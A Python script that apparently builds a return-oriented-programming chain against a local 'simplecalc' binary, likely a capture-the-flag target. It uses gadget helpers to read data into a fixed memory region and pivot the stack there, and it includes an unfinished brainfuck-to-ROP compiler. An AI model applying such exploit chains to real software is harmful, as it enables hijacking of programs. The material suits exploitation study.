#!/usr/bin/env python3

from metaGadget import *
import argparse
import brainfuck

EXEC_PATH = './simplecalc'

my_parser = argparse.ArgumentParser(description='Compiles to rop-code binary')

my_parser.add_argument('Input',
                       metavar='input',
                       type=str,
                       help='the path to the source code file')

args = my_parser.parse_args()
input_path = args.Input


class compiler:
    DATA_SIZE = 3

    def __init__(self, preprocessor : brainfuck.preprocessor, ea_data) -> None:
        self.preprocessor = preprocessor
        self.ea_data = ea_data
        self.tokens = '<>+-.,[]'


    def get_data_addr(self, index):
        return self.preprocessor.VAR_ARR + index * 8


    def do_ptr_move(self, direction):
        MOVE_PTR(self.preprocessor, direction)


    def do_ptr_value(self, positive):
        ADD_PTR(self.preprocessor, positive)


    def do_output(self):
        pass


    def do_input(self):
        pass

    def parse_token(self, token):
        assert token in self.tokens

        if token == '<':
            self.do_ptr_move(False)

        elif token == '>':
            self.do_ptr_move(True)

        elif token == '+':
            self.do_ptr_value(True)

        elif token == '-':
            self.do_ptr_value(False)

        elif token == '.':
            self.do_output()
        
        elif token == ',':
            self.do_input()

        elif token == '[':
            pass

        elif token == ']':
            pass
        else:
            raise('Unkown token')

    def exec_tokens(self, tokens):
        assert all(x in self.tokens for x in tokens)
        for token in tokens:
            self.parse_token(token)

    def init(self):
        for x in range(self.DATA_SIZE):
            PRE_ASSIGNMENT(self.get_data_addr(x), 0)

'''
pre = brainfuck.preprocessor(0x00000000006C1060)
bf = compiler(pre, 0x00000000006C1060)

pre.start()
bf.init()
'''

repository_start= 0x00000000006C1060
repository_end = 0x00000000006C5190

repository_size = repository_end - repository_start

ret2_read(0, repository_start, repository_size)
rsp_equ(repository_start)

finalize()
